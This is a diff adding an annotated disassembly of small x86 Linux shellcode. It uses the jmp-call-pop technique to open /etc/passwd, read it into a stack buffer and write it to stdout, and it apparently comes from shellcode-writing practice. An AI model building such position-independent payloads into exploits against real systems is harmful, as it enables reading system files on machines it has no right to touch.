@@ -1,0 +1,26 @@
+00000000  EB36              jmp short 0x38 	; Jump to call below, loading address of file we wish to read to stack
+00000002  B805000000        mov eax,0x5 	; Push 5 to EAX (file open)
+00000007  5B                pop ebx		; Pop address of file to read(/etc/passwd) to ebx
+00000008  31C9              xor ecx,ecx		; Clear ECX
+0000000A  CD80              int 0x80		; File Open Sys call
+0000000C  89C3              mov ebx,eax		; Move the open file descriptor from EAX to EBX
+0000000E  B803000000        mov eax,0x3		; Set EAX to 3, File read
+00000013  89E7              mov edi,esp		; Point EDI to the stack, which is being used as the read buffer
+00000015  89F9              mov ecx,edi		; Point ECX to EDI/ESP (read buffer)
+00000017  BA00100000        mov edx,0x1000	; Read buffer size of 4096
+0000001C  CD80              int 0x80		; file read sys call
+0000001E  89C2              mov edx,eax		
+00000020  B804000000        mov eax,0x4		; Move 4 to EAX (write)
+00000025  BB01000000        mov ebx,0x1		; move 1 to EBX STDOUT
+0000002A  CD80              int 0x80		; Write Syscall
+0000002C  B801000000        mov eax,0x1		; Move 1 to EAX (exit)
+00000031  BB00000000        mov ebx,0x0		; Move 0 to EBX (exit code 0)
+00000036  CD80              int 0x80		; Exit gracefully 
+00000038  E8C5FFFFFF        call 0x2 		; Calling back to continue code and load address of file to read
+0000003D  2F                das			
+0000003E  657463            gs jz 0xa4		;
+00000041  2F                das			;
+00000042  7061              jo 0xa5		; file to read, /etc/passwd
+00000044  7373              jnc 0xb9		;
+00000046  7764              ja 0xac		;
+00000048  00                db 0x00		;
